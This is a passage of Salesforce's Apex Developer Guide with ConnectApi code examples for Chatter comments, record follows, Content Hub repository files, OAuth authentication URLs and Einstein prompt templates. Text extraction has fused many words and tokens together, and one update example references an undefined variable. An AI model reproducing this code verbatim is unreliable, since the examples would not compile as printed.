Post a Comment
Call a method to post a comment.
Call postCommentToFeedElement(communityId,feedElementId,text) to post a plain text comment to a feed
element.
ConnectApi.Commentcomment= ConnectApi.ChatterFeeds.postCommentToFeedElement(null,
'0D5D0000000KuGh', 'I agreewiththe proposal.');
Post a Comment with a Mention
Make call or use the ConnectApiHelper repository to post a comment with a mention.
You can post comments with mentions two ways. Use the ConnectApiHelper repository on GitHub to write a single line of code, or use
this example, which calls postCommentToFeedElement(communityId,feedElementId,comment,
feedElementFileUpload).
StringcommunityId= null;
StringfeedElementId= '0D5D0000000KtW3';
ConnectApi.CommentInputcommentInput= new ConnectApi.CommentInput();
ConnectApi.MentionSegmentInputmentionSegmentInput= new ConnectApi.MentionSegmentInput();
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
417
Using Salesforce Features with ApexApex Developer Guide

textSegmentInput.text= 'Doesanyonein thisgrouphavean idea?';
messageBodyInput.messageSegments.add(textSegmentInput);
mentionSegmentInput.id= '005D00000000oOT';
messageBodyInput.messageSegments.add(mentionSegmentInput);
commentInput.body= messageBodyInput;
ConnectApi.CommentcommentRep= ConnectApi.ChatterFeeds.postCommentToFeedElement(communityId,
feedElementId,commentInput,null);
Post a Comment with an Existing File
Make a call to post a comment with an already uploaded file.
To post a comment and attach an existing file (already uploaded to Salesforce) to the comment, create a
ConnectApi.CommentInput object to pass to postCommentToFeedElement(communityId,feedElementId,
comment,feedElementFileUpload).
StringfeedElementId= '0D5D0000000KtW3';
ConnectApi.CommentInputcommentInput= new ConnectApi.CommentInput();
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
textSegmentInput.text= 'I attachedthisfilefromSalesforceFiles.';
messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
messageBodyInput.messageSegments.add(textSegmentInput);
commentInput.body= messageBodyInput;
ConnectApi.CommentCapabilitiesInputcommentCapabilitiesInput= new
ConnectApi.CommentCapabilitiesInput();
ConnectApi.ContentCapabilityInputcontentCapabilityInput= new
ConnectApi.ContentCapabilityInput();
commentCapabilitiesInput.content= contentCapabilityInput;
contentCapabilityInput.contentDocumentId= '069D00000001rNJ';
commentInput.capabilities= commentCapabilitiesInput;
ConnectApi.CommentcommentRep=
ConnectApi.ChatterFeeds.postCommentToFeedElement(Network.getNetworkId(),feedElementId,
commentInput,null);
Post a Comment with a New File
Call a method to post a comment with a new file.
418
Using Salesforce Features with ApexApex Developer Guide

To post a comment and upload and attach a new file to the comment, create a ConnectApi.CommentInput object and a
ConnectApi.BinaryInput object to pass to the postCommentToFeedElement(communityId,feedElementId,
comment,feedElementFileUpload) method.
StringfeedElementId= '0D5D0000000KtW3';
ConnectApi.CommentInputcommentInput= new ConnectApi.CommentInput();
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
textSegmentInput.text= 'Enjoythisnew file.';
messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
messageBodyInput.messageSegments.add(textSegmentInput);
commentInput.body= messageBodyInput;
ConnectApi.CommentCapabilitiesInputcommentCapabilitiesInput= new
ConnectApi.CommentCapabilitiesInput();
ConnectApi.ContentCapabilityInputcontentCapabilityInput= new
ConnectApi.ContentCapabilityInput();
commentCapabilitiesInput.content= contentCapabilityInput;
contentCapabilityInput.title= 'Title';
commentInput.capabilities= commentCapabilitiesInput;
Stringtext= 'Theseare the contentsof the new file.';
BlobmyBlob= Blob.valueOf(text);
ConnectApi.BinaryInputbinInput= new ConnectApi.BinaryInput(myBlob,'text/plain',
'fileName');
ConnectApi.CommentcommentRep=
ConnectApi.ChatterFeeds.postCommentToFeedElement(Network.getNetworkId(),feedElementId,
commentInput,binInput);
Post a Rich-Text Comment with Inline Image
Make a call or use the ConnectApiHelper repository to post a comment with an already uploaded, inline image.
You can post rich-text comments with inline images and mentions two ways. Use the ConnectApiHelper repository on GitHub to write
a single line of code, or use this example, which calls postCommentToFeedElement(communityId,feedElementId,
comment,feedElementFileUpload). In this example, the image file is existing content that has already been uploaded to
Salesforce.
StringcommunityId= null;
StringfeedElementId= '0D5R0000000SBEr';
StringimageId= '069R00000000IgQ';
StringmentionedUserId= '005R0000000DiMz';
ConnectApi.CommentInputinput= new ConnectApi.CommentInput();
ConnectApi.MessageBodyInputmessageInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegment;
ConnectApi.MentionSegmentInputmentionSegment;
419
Using Salesforce Features with ApexApex Developer Guide

ConnectApi.MarkupBeginSegmentInputmarkupBeginSegment;
ConnectApi.MarkupEndSegmentInputmarkupEndSegment;
ConnectApi.InlineImageSegmentInputinlineImageSegment;
messageInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
markupBeginSegment= new ConnectApi.MarkupBeginSegmentInput();
markupBeginSegment.markupType= ConnectApi.MarkupType.Bold;
messageInput.messageSegments.add(markupBeginSegment);
textSegment= new ConnectApi.TextSegmentInput();
textSegment.text= 'Hello';
messageInput.messageSegments.add(textSegment);
mentionSegment= new ConnectApi.MentionSegmentInput();
mentionSegment.id= mentionedUserId;
messageInput.messageSegments.add(mentionSegment);
textSegment= new ConnectApi.TextSegmentInput();
textSegment.text= '!';
messageInput.messageSegments.add(textSegment);
markupEndSegment= new ConnectApi.MarkupEndSegmentInput();
markupEndSegment.markupType= ConnectApi.MarkupType.Bold;
messageInput.messageSegments.add(markupEndSegment);
inlineImageSegment= new ConnectApi.InlineImageSegmentInput();
inlineImageSegment.altText= 'imageone';
inlineImageSegment.fileId= imageId;
messageInput.messageSegments.add(inlineImageSegment);
input.body= messageInput;
ConnectApi.ChatterFeeds.postCommentToFeedElement(communityId,feedElementId,input,null);
Post a Rich-Text Feed Comment with a Code Block
Call a method to post a comment with a code block.
This example calls postCommentToFeedElement(communityId,feedElementId,comment,
feedElementFileUpload) to post a comment with a code block.
StringcommunityId= null;
StringfeedElementId= '0D5R0000000SBEr';
StringcodeSnippet= '<html>\n\t<body>\n\t\tHello,world!\n\t</body>\n</html>';
ConnectApi.CommentInputinput= new ConnectApi.CommentInput();
ConnectApi.MessageBodyInputmessageInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegment;
ConnectApi.MarkupBeginSegmentInputmarkupBeginSegment;
ConnectApi.MarkupEndSegmentInputmarkupEndSegment;
messageInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
420
Using Salesforce Features with ApexApex Developer Guide

markupBeginSegment= new ConnectApi.MarkupBeginSegmentInput();
markupBeginSegment.markupType= ConnectApi.MarkupType.Code;
messageInput.messageSegments.add(markupBeginSegment);
textSegment= new ConnectApi.TextSegmentInput();
textSegment.text= codeSnippet;
messageInput.messageSegments.add(textSegment);
markupEndSegment= new ConnectApi.MarkupEndSegmentInput();
markupEndSegment.markupType= ConnectApi.MarkupType.Code;
messageInput.messageSegments.add(markupEndSegment);
input.body= messageInput;
ConnectApi.ChatterFeeds.postCommentToFeedElement(communityId,feedElementId,input,null);
Edit a Comment
Call a method to edit a comment.
Call updateComment(communityId,commentId,comment) to edit a comment.
StringcommentId;
StringcommunityId= Network.getNetworkId();
// Get the lastfeeditemcreatedby the contextuser.
List<FeedItem>feedItems= [SELECTId FROMFeedItemWHERECreatedById= :UserInfo.getUserId()
ORDERBY CreatedDateDESC];
if (feedItems.isEmpty()){
// Returnnullwithinanonymousapex.
returnnull;
}
StringfeedElementId= feedItems[0].id;
ConnectApi.CommentPagecommentPage=
ConnectApi.ChatterFeeds.getCommentsForFeedElement(communityId,feedElementId);
if (commentPage.items.isEmpty()){
// Returnnullwithinanonymousapex.
returnnull;
}
commentId= commentPage.items[0].id;
ConnectApi.FeedEntityIsEditableisEditable=
ConnectApi.ChatterFeeds.isCommentEditableByMe(communityId,commentId);
if (isEditable.isEditableByMe== true){
ConnectApi.CommentInputcommentInput= new ConnectApi.CommentInput();
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
textSegmentInput.text= 'Thisis my editedcomment.';
messageBodyInput.messageSegments.add(textSegmentInput);
421
Using Salesforce Features with ApexApex Developer Guide

commentInput.body= messageBodyInput;
ConnectApi.CommenteditedComment= ConnectApi.ChatterFeeds.updateComment(communityId,
commentId,commentInput);
}
Follow a Record
Call a method to follow a record.
Call follow(communityId,userId,subjectId) to follow a record.
ChatterUsers.ConnectApi.SubscriptionsubscriptionToRecord=
ConnectApi.ChatterUsers.follow(null, 'me', '001RR000002G4Y0');
SEE ALSO:
Unfollow a Record
Unfollow a Record
Call a method to stop following a record.
When you follow a record such as a user, the call to ConnectApi.ChatterUsers.follow returns a
ConnectApi.Subscription object. To unfollow a record, pass the id property of that object to
deleteSubscription(communityId,subscriptionId).
ConnectApi.Chatter.deleteSubscription(null, '0E8RR0000004CnK0AU');
SEE ALSO:
Follow a Record
Get a Repository
Call a method to get a repository.
Call getRepository(repositoryId) to get a repository.
finalstringrepositoryId= '0XCxx0000000123GAA';
finalConnectApi.ContentHubRepositoryrepository=
ConnectApi.ContentHub.getRepository(repositoryId);
Get Repositories
Call a method to get all repositories.
Call getRepositories() to get all repositories and get the first SharePoint online repository found.
finalstringsharePointOnlineProviderType='ContentHubSharepointOffice365';
finalConnectApi.ContentHubRepositoryCollectionrepositoryCollection=
ConnectApi.ContentHub.getRepositories();
ConnectApi.ContentHubRepositorysharePointOnlineRepository= null;
for(ConnectApi.ContentHubRepositoryrepository: repositoryCollection.repositories){
422
Using Salesforce Features with ApexApex Developer Guide

if(sharePointOnlineProviderType.equalsIgnoreCase(repository.providerType.type)){
sharePointOnlineRepository= repository;
break;
}
}
Get Allowed Item Types
Call a method to get allowed item types.
Call getAllowedItemTypes(repositoryId,repositoryFolderId,filter) with a filter of FilesOnly
to get the first ConnectApi.ContentHubItemTypeSummary.id of a file. The context user can create allowed files in a
repository folder in the external system.
finalConnectApi.ContentHubAllowedItemTypeCollectionallowedItemTypesColl=
ConnectApi.ContentHub.getAllowedItemTypes(repositoryId,repositoryFolderId,
ConnectApi.ContentHubItemType.FilesOnly);
finalList<ConnectApi.ContentHubItemTypeSummary>allowedItemTypes=
allowedItemTypesColl.allowedItemTypes;
stringallowedFileItemTypeId= null;
if(allowedItemTypes.size()> 0){
ConnectApi.ContentHubItemTypeSummaryallowedItemTypeSummary= allowedItemTypes.get(0);
allowedFileItemTypeId= allowedItemTypeSummary.id;
}
Get Previews
Call a method to get all supported preview formats and their respective URLs.
Call getPreviews(repositoryId,repositoryFileId) to get all supported preview formats and their respective URLs
and number of renditions. For each supported preview format, we show every rendition URL available.
finalStringgDriveRepositoryId= '0XCxx00000000ODGAY', gDriveFileId=
'document:1-zcA1BaeoQbo2_yNFiHCcK6QJTPmOke-kHFC4TYg3rk';
finalConnectApi.FilePreviewCollectionpreviewsCollection=
ConnectApi.ContentHub.getPreviews(gDriveRepositoryId,gDriveFileId);
for(ConnectApi.FilePreviewfilePreview: previewsCollection.previews){
System.debug(String.format('Preview- URL:\'\'{0}\'\',format:\'\'{1}\'\',nbr of
renditionsfor thisformat:{2}', new String[]{ filePreview.url,
filePreview.format.name(),String.valueOf(filePreview.previewUrls.size())}));
for(ConnectApi.FilePreviewUrlfilePreviewUrl: filePreview.previewUrls){
System.debug('----->RenditionURL:' + filePreviewUrl.previewUrl);
}
}
Get a File Preview
Call a method to get a file preview.
423
Using Salesforce Features with ApexApex Developer Guide

Call getFilePreview(repositoryId,repositoryFileId,formatType) with a formatType of Thumbnail
to get the thumbnail format preview along with its respective URL and number of thumbnail renditions. For each thumbnail format, we
show every rendition URL available.
finalStringgDriveRepositoryId= '0XCxx00000000ODGAY', gDriveFileId=
'document:1-zcA1BaeoQbo2_yNFiHCcK6QJTPmOke-kHFC4TYg3rk';
finalConnectApi.FilePreviewCollectionpreviewsCollection=
ConnectApi.ContentHub.getPreviews(gDriveRepositoryId,gDriveFileId);
for(ConnectApi.FilePreviewfilePreview: previewsCollection.previews){
System.debug(String.format('Preview- URL:\'\'{0}\'\',format:\'\'{1}\'\',nbr of
renditionsfor thisformat:{2}', new String[]{ filePreview.url,
filePreview.format.name(),String.valueOf(filePreview.previewUrls.size())}));
for(ConnectApi.FilePreviewUrlfilePreviewUrl: filePreview.previewUrls){
System.debug('----->RenditionURL:' + filePreviewUrl.previewUrl);
}
}
Get Repository Folder Items
Call a method to get a collection of repository folder items.
Call getRepositoryFolderItems(repositoryId,repositoryFolderId) to get the collection of items in a
repository folder. For files, we show the file’s name, size, external URL, and download URL. For folders, we show the folder’s name,
description, and external URL.
finalStringgDriveRepositoryId= '0XCxx00000000ODGAY', gDriveFolderId=
'folder:0B0lTys1KmM3sSVJ2bjIzTGFqSWs';
finalConnectApi.RepositoryFolderItemsCollectionfolderItemsColl=
ConnectApi.ContentHub.getRepositoryFolderItems(gDriveRepositoryId,gDriveFolderId);
finalList<ConnectApi.RepositoryFolderItem>folderItems= folderItemsColl.items;
System.debug('Numberof itemsin repositoryfolder:' + folderItems.size());
for(ConnectApi.RepositoryFolderItemitem: folderItems){
ConnectApi.RepositoryFileSummaryfileSummary= item.file;
if(fileSummary!= null){
System.debug(String.format('Fileitem- name:\'\'{0}\'\',size:{1},externalURL:
\'\'{2}\'\',downloadURL:\'\'{3}\'\'', new String[]{ fileSummary.name,
String.valueOf(fileSummary.contentSize),fileSummary.externalDocumentUrl,
fileSummary.downloadUrl}));
}else{
ConnectApi.RepositoryFolderSummaryfolderSummary= item.folder;
System.debug(String.format('Folderitem- name:\'\'{0}\'\',description:
\'\'{1}\'\'',  new String[]{ folderSummary.name,folderSummary.description}));
}
}
Get a Repository Folder
Call a method to get a repository folder.
Call getRepositoryFolder(repositoryId,repositoryFolderId) to get a repository folder.
finalStringgDriveRepositoryId= '0XCxx00000000ODGAY', gDriveFolderId=
'folder:0B0lTys1KmM3sSVJ2bjIzTGFqSWs';
finalConnectApi.RepositoryFolderDetailfolder=
ConnectApi.ContentHub.getRepositoryFolder(gDriveRepositoryId,gDriveFolderId);
424
Using Salesforce Features with ApexApex Developer Guide

System.debug(String.format('Folder- name:\'\'{0}\'\',description:\'\'{1}\'\',external
URL:\'\'{2}\'\',folderitemsURL:\'\'{3}\'\'',
new String[]{ folder.name,folder.description,folder.externalFolderUrl,
folder.folderItemsUrl}));
Get a Repository File Without Permissions Information
Call a method to get a repository file without permission information.
Call getRepositoryFile(repositoryId,repositoryFileId) to get a repository file without permissions information.
finalStringgDriveRepositoryId= '0XCxx00000000ODGAY', gDriveFileId=
'file:0B0lTys1KmM3sTmxKNjVJbWZja00';
finalConnectApi.RepositoryFileDetailfile=
ConnectApi.ContentHub.getRepositoryFile(gDriveRepositoryId,gDriveFileId);
System.debug(String.format('File- name:\'\'{0}\'\',size:{1},externalURL:\'\'{2}\'\',
downloadURL:\'\'{3}\'\'',
new String[]{ file.name,String.valueOf(file.contentSize),file.externalDocumentUrl,
file.downloadUrl}));
Get a Repository File with Permissions Information
Call a method to get a repository file with permission information.
Call getRepositoryFile(repositoryId,repositoryFileId,includeExternalFilePermissionsInfo)
to get a repository file with permissions information.
finalStringgDriveRepositoryId= '0XCxx00000000ODGAY', gDriveFileId=
'file:0B0lTys1KmM3sTmxKNjVJbWZja00';
finalConnectApi.RepositoryFileDetailfile=
ConnectApi.ContentHub.getRepositoryFile(gDriveRepositoryId,gDriveFileId,true);
System.debug(String.format('File- name:\'\'{0}\'\',size:{1},externalURL:\'\'{2}\'\',
downloadURL:\'\'{3}\'\'', new String[]{ file.name,String.valueOf(file.contentSize),
file.externalDocumentUrl,file.downloadUrl}));
finalConnectApi.ExternalFilePermissionInformationexternalFilePermInfo=
file.externalFilePermissionInformation;
//permissiontypes
finalList<ConnectApi.ContentHubPermissionType>permissionTypes=
externalFilePermInfo.externalFilePermissionTypes;
for(ConnectApi.ContentHubPermissionTypepermissionType: permissionTypes){
System.debug(String.format('Permissiontype- id: \'\'{0}\'\',label:\'\'{1}\'\'', new
String[]{ permissionType.id,permissionType.label}));
}
//permissiongroups
finalList<ConnectApi.RepositoryGroupSummary>groups=
externalFilePermInfo.repositoryPublicGroups;
for(ConnectApi.RepositoryGroupSummaryggroup: groups){
System.debug(String.format('Group- id: \'\'{0}\'\',name:\'\'{1}\'\',type:
\'\'{2}\'\'', new String[]{ ggroup.id,ggroup.name,ggroup.type.name()}));
}
425
Using Salesforce Features with ApexApex Developer Guide

Create a Repository File Without Content (Metadata Only)
Call a method to create a file without binary content (metadata only) in a Google Drive repository folder.
Call addRepositoryItem(repositoryId,repositoryFolderId,file) to create a file without binary content
(metadata only) in a Google Drive repository folder. After the file is created, we show the file’s ID, name, description, external URL, and
download URL.
finalStringgDriveRepositoryId= '0XCxx00000000ODGAY', gDriveFolderId=
'folder:0B0lTys1KmM3sSVJ2bjIzTGFqSWs';
finalConnectApi.ContentHubItemInputnewItem= new ConnectApi.ContentHubItemInput();
newItem.itemTypeId= 'document'; //seegetAllowedTypesfor any fileitemtypesavailable
for creation/update
newItem.fields= new List<ConnectApi.ContentHubFieldValueInput>();
//Metadata:namefield
finalConnectApi.ContentHubFieldValueInputfieldValueInput= new
ConnectApi.ContentHubFieldValueInput();
fieldValueInput.name= 'name';
fieldValueInput.value= 'newfolderitemname.txt';
newItem.fields.add(fieldValueInput);
//Metadata:descriptionfield
finalConnectApi.ContentHubFieldValueInputfieldValueInputDesc= new
ConnectApi.ContentHubFieldValueInput();
fieldValueInputDesc.name= 'description';
fieldValueInputDesc.value= 'It doesdescribeit';
newItem.fields.add(fieldValueInputDesc);
finalConnectApi.RepositoryFolderItemnewFolderItem=
ConnectApi.ContentHub.addRepositoryItem(gDriveRepositoryId,gDriveFolderId,newItem);
finalConnectApi.RepositoryFileSummarynewFile= newFolderItem.file;
System.debug(String.format('Newfile- id: \'\'{0}\'\',name:\'\'{1}\'\',description:
\'\'{2}\'\'\n externalURL:\'\'{3}\'\',downloadURL:\'\'{4}\'\'', new String[]{
newFile.id,newFile.name,newFile.description,newFile.externalDocumentUrl,
newFile.downloadUrl}));
SEE ALSO:
Apex Reference Guide: ConnectApi.ContentHubItemInput
Apex Reference Guide: ConnectApi.ContentHubFieldValueInput
Create a Repository File with Content
Call a method to create a file with binary content in a Google Drive repository folder.
Call addRepositoryItem(repositoryId,repositoryFolderId,file,filedata) to create a file with binary
content in a Google Drive repository folder. After the file is created, we show the file’s ID, name, description, external URL, and download
URL.
finalStringgDriveRepositoryId= '0XCxx00000000ODGAY', gDriveFolderId=
'folder:0B0lTys1KmM3sSVJ2bjIzTGFqSWs';
finalConnectApi.ContentHubItemInputnewItem= new ConnectApi.ContentHubItemInput();
426
Using Salesforce Features with ApexApex Developer Guide

newItem.itemTypeId= 'document'; //seegetAllowedTypesfor any fileitemtypesavailable
for creation/update
newItem.fields= new List<ConnectApi.ContentHubFieldValueInput>();
//Metadata:namefield
FinalStringnewFileName= 'newfolderitemname.txt';
finalConnectApi.ContentHubFieldValueInputfieldValueInput= new
ConnectApi.ContentHubFieldValueInput();
fieldValueInput.name= 'name';
fieldValueInput.value= newFileName;
newItem.fields.add(fieldValueInput);
//Metadata:descriptionfield
finalConnectApi.ContentHubFieldValueInputfieldValueInputDesc= new
ConnectApi.ContentHubFieldValueInput();
fieldValueInputDesc.name= 'description';
fieldValueInputDesc.value= 'It doesdescribeit';
newItem.fields.add(fieldValueInputDesc);
//Binarycontent
finalBlobnewFileBlob= Blob.valueOf('awesomecontentfor brandnew file');
finalStringnewFileMimeType= 'text/plain';
finalConnectApi.BinaryInputfileBinaryInput= new ConnectApi.BinaryInput(newFileBlob,
newFileMimeType,newFileName);
finalConnectApi.RepositoryFolderItemnewFolderItem=
ConnectApi.ContentHub.addRepositoryItem(gDriveRepositoryId,gDriveFolderId,newItem,
fileBinaryInput);
finalConnectApi.RepositoryFileSummarynewFile= newFolderItem.file;
System.debug(String.format('Newfile- id: \'\'{0}\'\',name:\'\'{1}\'\',description:
\'\'{2}\'\'\n externalURL:\'\'{3}\'\',downloadURL:\'\'{4}\'\'', new String[]{
newFile.id,newFile.name,newFile.description,newFile.externalDocumentUrl,
newFile.downloadUrl}));
SEE ALSO:
Apex Reference Guide: ConnectApi.ContentHubItemInput
Apex Reference Guide: ConnectApi.ContentHubFieldValueInput
Apex Reference Guide: ConnectApi.BinaryInput
Update a Repository File Without Content (Metadata Only)
Call a method to update the metadata of a repository file.
Call updateRepositoryFile(repositoryId,repositoryFileId,file) to update the metadata of a file in a
repository folder. After the file is updated, we show the file’s ID, name, description, external URL, download URL.
finalStringgDriveRepositoryId= '0XCxx00000000ODGAY', gDriveFolderId=
'folder:0B0lTys1KmM3sSVJ2bjIzTGFqSWs', gDriveFileId=
'document:1q9OatVpcyYBK-JWzp_PhR75ulQghwFP15zhkamKrRcQ';
finalConnectApi.ContentHubItemInputupdatedItem= new ConnectApi.ContentHubItemInput();
updatedItem.itemTypeId= 'document'; //seegetAllowedTypesfor any fileitemtypesavailable
for creation/update
427
Using Salesforce Features with ApexApex Developer Guide

updatedItem.fields= new List<ConnectApi.ContentHubFieldValueInput>();
//Metadata:namefield
finalConnectApi.ContentHubFieldValueInputfieldValueInputName= new
ConnectApi.ContentHubFieldValueInput();
fieldValueInputName.name= 'name';
fieldValueInputName.value=  'updatedfilename.txt';
updatedItem.fields.add(fieldValueInputName);
finalConnectApi.RepositoryFileDetailupdatedFile=
ConnectApi.ContentHub.updateRepositoryFile(gDriveRepositoryId,gDriveFileId,updatedItem);
System.debug(String.format('Updatedfile- id: \'\'{0}\'\',name:\'\'{1}\'\',description:
\'\'{2}\'\',\nexternalURL:\'\'{3}\'\',downloadURL:\'\'{4}\'\'',  new String[]{
updatedFile.id,updatedFile.name,updatedFile.description,updatedFile.externalDocumentUrl,
updatedFile.downloadUrl}));
SEE ALSO:
Apex Reference Guide: ConnectApi.ContentHubItemInput
Apex Reference Guide: ConnectApi.ContentHubFieldValueInput
Update a Repository File with Content
Call a method to update a repository file with content.
Call updateRepositoryFile(repositoryId,repositoryFileId,file,fileData) to update the content
and metadata of a file in a repository. After the file is updated, we show the file’s ID, name, description, external URL, and download URL.
finalStringgDriveRepositoryId= '0XCxx00000000ODGAY', gDriveFolderId=
'folder:0B0lTys1KmM3sSVJ2bjIzTGFqSWs', gDriveFileId=
'document:1q9OatVpcyYBK-JWzp_PhR75ulQghwFP15zhkamKrRcQ';
finalConnectApi.ContentHubItemInputupdatedItem= new ConnectApi.ContentHubItemInput();
updatedItem.itemTypeId= 'document'; //seegetAllowedTypesfor any fileitemtypesavailable
for creation/update
updatedItem.fields= new List<ConnectApi.ContentHubFieldValueInput>();
//Metadata:namefield
finalConnectApi.ContentHubFieldValueInputfieldValueInputName= new
ConnectApi.ContentHubFieldValueInput();
fieldValueInputName.name= 'name';
fieldValueInputName.value=  'updatedfilename.txt';
updatedItem.fields.add(fieldValueInputName);
//Binarycontent
finalBlobupdatedFileBlob= Blob.valueOf('evenmoreawesomecontentfor updatedfile');
finalStringupdatedFileMimeType= 'text/plain';
finalConnectApi.BinaryInputfileBinaryInput= new ConnectApi.BinaryInput(updatedFileBlob,
updatedFileMimeType,updatedFileName);
finalConnectApi.RepositoryFileDetailupdatedFile=
ConnectApi.ContentHub.updateRepositoryFile(gDriveRepositoryId,gDriveFileId,updatedItem);
System.debug(String.format('Updatedfile- id: \'\'{0}\'\',name:\'\'{1}\'\',description:
\'\'{2}\'\',\nexternalURL:\'\'{3}\'\',downloadURL:\'\'{4}\'\'',  new String[]{
428
Using Salesforce Features with ApexApex Developer Guide

updatedFile.id,updatedFile.name,updatedFile.description,updatedFile.externalDocumentUrl,
updatedFile.downloadUrl}));
SEE ALSO:
Apex Reference Guide: ConnectApi.ContentHubItemInput
Apex Reference Guide: ConnectApi.ContentHubFieldValueInput
Apex Reference Guide: ConnectApi.BinaryInput
Get an Authentication URL
Call a method to get an authentication URL.
Call getOAuthCredentialAuthUrl(requestBody) to retrieve the URL that a user must visit to begin an authentication
flow, ultimately returning authentication tokens to Salesforce. Accepts input parameters representing a specific external credential and,
optionally, a named principal. Use this method as part of building a customized or branded user interface to help users initiate
authentication.
ConnectApi.OAuthCredentialAuthUrlInputinput= new ConnectApi.OAuthCredentialAuthUrlInput();
input.externalCredential= 'MyExternalCredentialDeveloperName';
input.principalType= ConnectApi.CredentialPrincipalType.PerUserPrincipal;
input.principalName= 'MyPrincipal'; // OnlyrequiredwhenprincipalType= NamedPrincipal
ConnectApi.OAuthCredentialAuthUrloutput=
ConnectApi.NamedCredentials.getOAuthCredentialAuthUrl(input);
StringauthenticationUrl= output.authenticationUrl;// Redirectusersto thisURL to
authenticatein the browser
SEE ALSO:
Apex Reference Guide: NamedCredentials Methods
Resolve a Prompt Template
Call a method to resolve a prompt template.
Call generateMessagesForPromptTemplate(promptTemplateDevName,
promptTemplateGenerationsInput) to resolve a prompt template.
To resolve a prompt template, create an input object, build input maps, configure additional settings, call the service, and handle the
resolution and response.
To create an input object, create an instance of ConnectApi.EinsteinPromptTemplateGenerationsInput.
To store input parameters for the prompt template, build input maps using Map<String,ConnectApi.WrappedValue>.
Wrap the input maps in ConnectApi.WrappedValue and add them to a ConnectApi.WrappedValue map with identifying
keys. You can also wrap a string input in ConnectApi.WrappedValue and add it to a map.
To configure additional settings, create an instance of ConnectApi.EinsteinLlmAdditionalConfigInput and assign
it to the additionalConfig property of the input object.
To generate messages based on the prompt template and input parameters, call the generateMessagesForPromptTemplate
method of the ConnectApi.EinsteinLLM class with the prompt template ID and the input object.
429
Using Salesforce Features with ApexApex Developer Guide

To access the prompt resolution, use generationsOutput.prompt and, to access the first generated response, use
generationsOutput.generations[0].text.
Resolve a Flex Prompt Template with Apex and Flow Resources
// Createinput
ConnectApi.EinsteinPromptTemplateGenerationsInputpromptGenerationsInput= new
ConnectApi.EinsteinPromptTemplateGenerationsInput();
promptGenerationsInput.isPreview= false;
// Buildinputmap
Map<String,ConnectApi.WrappedValue>valueMap= new
Map<String,ConnectApi.WrappedValue>();
Map<String,String>account1RecordIdMap= new Map<String,String>();
account1RecordIdMap.put('id','001xx000003H9cuAAC');// AccountID
Map<String,String>account2RecordIdMap= new Map<String,String>();
account2RecordIdMap.put('id','001xx000003H9ctAAC');// AccountID
Map<String,String>case1RecordIdMap= new Map<String,String>();
case1RecordIdMap.put('id','500xx000000cJ7rAAE');// CaseID
// Add wrappedvaluesto map
ConnectApi.WrappedValueaccount1WrappedValue= new ConnectApi.WrappedValue();
account1WrappedValue.value= account1RecordIdMap;
ConnectApi.WrappedValueaccount2WrappedValue= new ConnectApi.WrappedValue();
account2WrappedValue.value= account2RecordIdMap;
ConnectApi.WrappedValuecase1WrappedValue= new ConnectApi.WrappedValue();
case1WrappedValue.value= case1RecordIdMap;
valueMap.put('Input:Account_1',account1WrappedValue);
valueMap.put('Input:Account_2',account2WrappedValue);
valueMap.put('Input:Case_1',case1WrappedValue);
// Add stringinput
ConnectApi.WrappedValuestrWrappedValue= new ConnectApi.WrappedValue();
strWrappedValue.value= 'My stringinput';
valueMap.put('Input:My_Free_Text1',strWrappedValue);
promptGenerationsInput.inputParams= valueMap;
// Set additionalconfigurationvalues
promptGenerationsInput.additionalConfig= new ConnectApi.EinsteinLlmAdditionalConfigInput();
promptGenerationsInput.additionalConfig.applicationName=
'PromptTemplateGenerationsInvocable';
// Callthe serviceusingthe prompttemplateID
ConnectApi.EinsteinPromptTemplateGenerationsRepresentationgenerationsOutput=
ConnectApi.EinsteinLLM.generateMessagesForPromptTemplate('0hfxx0000000KQ9AAM',
430
Using Salesforce Features with ApexApex Developer Guide

promptGenerationsInput);
// Consumeresolution
System.debug('Promptresolution:' + generationsOutput.prompt);
// Consumeresponse
System.debug('Promptresponse:' + generationsOutput.generations[0].text);
Resolve a Sales Email Prompt Template
// Createinput
ConnectApi.EinsteinPromptTemplateGenerationsInputpromptGenerationsInput= new
ConnectApi.EinsteinPromptTemplateGenerationsInput();
promptGenerationsInput.isPreview= false;
// Buildinputmap
Map<String,ConnectApi.WrappedValue>valueMap= new Map<String,ConnectApi.WrappedValue>();
Map<String,String>recipientEntityRecordIdMap= new Map<String,String>();
recipientEntityRecordIdMap.put('id','00Qxx000002ToPvEAK');
Map<String,String>senderEntityRecordIdMap= new Map<String,String>();
senderEntityRecordIdMap.put('id','005xx000001XiWLAA0');
ConnectApi.WrappedValuerecipientEntityWrappedValue= new ConnectApi.WrappedValue();
recipientEntityWrappedValue.value= recipientEntityRecordIdMap;
ConnectApi.WrappedValuesenderEntityWrappedValue= new ConnectApi.WrappedValue();
senderEntityWrappedValue.value= senderEntityRecordIdMap;
valueMap.put('Input:Account',recipientEntityWrappedValue);
valueMap.put('Input:Recipient',recipientEntityWrappedValue);
valueMap.put('Input:Sender',senderEntityWrappedValue);
promptGenerationsInput.inputParams= valueMap;
// Set additionalconfigurationvalues
promptGenerationsInput.additionalConfig= new ConnectApi.EinsteinLlmAdditionalConfigInput();
promptGenerationsInput.additionalConfig.applicationName=
'PromptTemplateGenerationsInvocable';
// Callthe service
ConnectApi.EinsteinPromptTemplateGenerationsRepresentationgenerationsOutput=
ConnectApi.EinsteinLLM.generateMessagesForPromptTemplate('0hfxx0000000KTNAA2',
promptGenerationsInput);
// Consumeresponse
System.debug('PromptTesting:' + generationsOutput.prompt);
431
